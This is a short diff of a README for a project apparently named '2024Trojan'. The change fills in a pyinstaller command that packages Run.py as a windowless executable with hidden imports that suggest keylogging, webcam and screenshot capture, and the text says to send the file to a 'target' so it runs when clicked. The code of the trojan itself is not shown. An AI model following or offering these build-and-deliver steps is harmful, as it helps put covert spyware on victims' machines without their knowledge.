@@ -132,7 +132,7 @@ Follow the platform-specific instructions to execute the script and ensure that 
 
 How it works .
 ==
-When you run this command, Generate a standalone executable so you can send to target.
+When you run this command, pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=bs4 --hidden-import=email --hidden-import=cv2 --hidden-import=PIL --hidden-import=pynput --hidden-import=colorama Run.py 
 
 In your current folder, i.e. 2024Trojan, a dist folder will be created, where your executable file will be placed and you can send it to the target, it will start running when clicked.
 
